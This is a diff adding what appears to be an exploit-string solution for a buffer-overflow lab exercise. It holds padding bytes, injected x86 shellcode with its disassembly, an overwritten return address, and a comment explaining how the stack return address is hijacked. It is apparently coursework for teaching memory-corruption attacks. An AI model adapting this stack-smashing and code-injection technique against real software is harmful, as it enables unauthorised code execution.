@@ -1,0 +1,25 @@
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41
+/* pad 44 bytes */
+
+b8 bb 00 27 57
+bd 00 33 68 55
+68 94 8d 04 08
+c3
+/*
+
+movl    $0x572700bb, %eax
+movl    $0x55683300, %ebp
+pushl   $0x08048d94
+ret
+
+*/
+
+c4 32 68 55
+/*
+our return address starts at $ebp-8, so we pad 44bytes and overwrite the return address with the address for our function
+*/
+
+/*
